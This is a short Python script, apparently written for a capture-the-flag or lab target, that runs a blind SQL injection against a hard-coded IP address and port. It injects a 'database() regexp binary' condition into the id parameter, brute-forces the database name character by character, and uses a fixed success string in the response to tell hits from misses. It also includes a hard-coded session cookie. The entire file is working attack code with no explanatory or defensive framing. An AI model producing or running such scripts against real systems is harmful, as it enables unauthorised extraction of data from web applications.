import requests
import string

cookies = {
    '$PHPSESSID': 'ldiom6m94upgr0r5esb5bh9442',
}

headers = {
    '$Host': '192.144.182.32:20007',
    '$User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    '$Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    '$Accept-Language': 'en-US,en;q=0.5',
    '$Accept-Encoding': 'gzip, deflate',
    '$Connection': 'close',
    '$Upgrade-Insecure-Requests': '1',
}

s = ""
for i in range(32):
    for j in string.printable:
        params = (
            ('id', "1 and database() regexp binary '^{}'".format(s + j)),
        )
        print(params)
        response = requests.get('http://192.144.182.32:20007/', headers=headers, params=params, cookies=cookies, verify=False)
        if "äºä¸ªå­ï¼å°±å¹²" in response.text:
            s += j
            break
    print(s)